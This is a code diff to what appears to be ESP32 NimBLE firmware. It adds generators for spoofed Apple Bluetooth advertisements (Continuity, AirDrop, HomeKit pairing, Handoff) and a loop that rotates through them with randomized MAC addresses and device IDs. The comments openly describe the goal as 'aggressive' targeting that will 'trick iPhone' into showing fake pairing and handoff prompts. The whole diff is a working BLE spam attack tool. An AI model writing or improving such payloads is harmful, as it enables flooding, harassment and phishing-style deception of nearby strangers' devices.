@@ -14,17 +14,35 @@ NimBLEAdvertising *g_pAdvertising = nullptr;
 }
 
 void generateContinuityPayload(uint8_t *buf, uint8_t &len) {
-    buf[0] = 0x0F;           // Continuity type
-    buf[1] = 0x01;           // Length: 1 byte
-    buf[2] = 0x02;           // Flags: 0x02 = general discoverable
+    // Aggressive Apple Continuity with multiple spoofed variants
+    buf[0] = 0xFF;           // Manufacturer Specific Data
+    buf[1] = 0x4C;           // Apple Inc. LSB
+    buf[2] = 0x00;           // Apple Inc. MSB
 
+    // Continuity type (varies: 0x01-0x09 for different Apple services)
+    uint8_t contType = random(0x01, 0x0A);
+    buf[3] = contType;
+    buf[4] = 0x00;
+
+    // Random sequence ID (mimics real device state changes)
     uint32_t seq = random(0xFFFFFFFF);
-    buf[3] = (seq >> 24) & 0xFF;
-    buf[4] = (seq >> 16) & 0xFF;
-    buf[5] = (seq >> 8) & 0xFF;
-    buf[6] = seq & 0xFF;
+    buf[5] = (seq >> 24) & 0xFF;
+    buf[6] = (seq >> 16) & 0xFF;
+    buf[7] = (seq >> 8) & 0xFF;
+    buf[8] = seq & 0xFF;
 
-    len = 7;
+    // Status flags (connected/available + power level)
+    buf[9] = 0x01 | (random(0x00, 0x08) << 1);
+
+    // Fake RSSI (appears strong = device nearby = more convincing)
+    buf[10] = random(0xC0, 0xFF);
+
+    // Random device identifier (makes each packet look like different device)
+    for (int i = 11; i < 19; i++) {
+        buf[i] = random(0x00, 0xFF);
+    }
+
+    len = 19;
 }
 
 void generateFastPairPayload(const String &ssid, uint8_t *buf, uint8_t &len) {
@@ -73,6 +91,70 @@ void generateGenericPairingPayload(uint8_t *buf, uint8_t &len) {
     }
 
     len = 15;
+}
+
+void generateAirDropPayload(uint8_t *buf, uint8_t &len) {
+    // Aggressive AirDrop - spoofed MacBook/iPhone nearby offering file transfer
+    buf[0] = 0xFF;
+    buf[1] = 0x4C;           // Apple
+    buf[2] = 0x00;
+
+    buf[3] = 0x05;           // AirDrop type
+    buf[4] = 0x12;           // Version indicator
+
+    // Fake device hash (different each packet = looks like multiple devices)
+    for (int i = 5; i < 15; i++) {
+        buf[i] = random(0x00, 0xFF);
+    }
+
+    // Capabilities + status (appears ready to receive)
+    buf[15] = 0x01 | (random(0, 0x02) << 1);
+
+    len = 16;
+}
+
+void generateHomeKitPayload(uint8_t *buf, uint8_t &len) {
+    // HomeKit accessory in pairing mode - very aggressive
+    buf[0] = 0xFF;
+    buf[1] = 0x4C;
+    buf[2] = 0x00;
+
+    buf[3] = 0x06;           // HomeKit type
+    buf[4] = 0x01;           // Protocol version
+
+    // Random accessory ID (looks like different HomeKit device each time)
+    for (int i = 5; i < 11; i++) {
+        buf[i] = random(0x00, 0xFF);
+    }
+
+    // Status flags: 0x01 = unpaired/pairing mode (very attractive to iPhone)
+    buf[11] = 0x01 | random(0x00, 0x04);
+
+    // Setup code hash (looks legitimate)
+    buf[12] = random(0x00, 0xFF);
+    buf[13] = random(0x00, 0xFF);
+
+    len = 14;
+}
+
+void generateHandoffPayload(uint8_t *buf, uint8_t &len) {
+    // Handoff protocol - trick iPhone into showing "Continue on iPhone" prompts
+    buf[0] = 0xFF;
+    buf[1] = 0x4C;
+    buf[2] = 0x00;
+
+    buf[3] = 0x0C;           // Handoff/Continuity action type
+    buf[4] = 0x01;           // Version
+
+    // Fake activity ID (different each time)
+    for (int i = 5; i < 13; i++) {
+        buf[i] = random(0x00, 0xFF);
+    }
+
+    // App type (Safari, Mail, Notes, etc)
+    buf[13] = random(0x01, 0x0F);
+
+    len = 14;
 }
 
 void randomizeBLE_MAC(uint8_t *addr) {
@@ -142,19 +224,37 @@ SpamResult spam(const SpamConfig &config) {
                 randomizeBLE_MAC(bleAddr);
 
                 // Generate payload based on spam type
-                switch (config.type) {
-                    case CONTINUITY:
-                        generateContinuityPayload(payload, payloadLen);
-                        break;
-                    case FAST_PAIR:
-                        generateFastPairPayload(config.customSSID, payload, payloadLen);
-                        break;
-                    case SWIFT_PAIR:
-                        generateSwiftPairPayload(payload, payloadLen);
-                        break;
-                    case GENERIC_PAIRING:
-                        generateGenericPairingPayload(payload, payloadLen);
-                        break;
+                // For CONTINUITY: aggressive Apple targeting (rotates through all Apple services)
+                if (config.type == CONTINUITY) {
+                    uint8_t appleType = (g_packetCount % 4);
+                    switch (appleType) {
+                        case 0:
+                            generateContinuityPayload(payload, payloadLen);
+                            break;
+                        case 1:
+                            generateAirDropPayload(payload, payloadLen);
+                            break;
+                        case 2:
+                            generateHomeKitPayload(payload, payloadLen);
+                            break;
+                        case 3:
+                            generateHandoffPayload(payload, payloadLen);
+                            break;
+                    }
+                } else {
+                    switch (config.type) {
+                        case CONTINUITY:  // Already handled above
+                            break;
+                        case FAST_PAIR:
+                            generateFastPairPayload(config.customSSID, payload, payloadLen);
+                            break;
+                        case SWIFT_PAIR:
+                            generateSwiftPairPayload(payload, payloadLen);
+                            break;
+                        case GENERIC_PAIRING:
+                            generateGenericPairingPayload(payload, payloadLen);
+                            break;
+                    }
                 }
 
                 // Setup NimBLE advertisement with payload
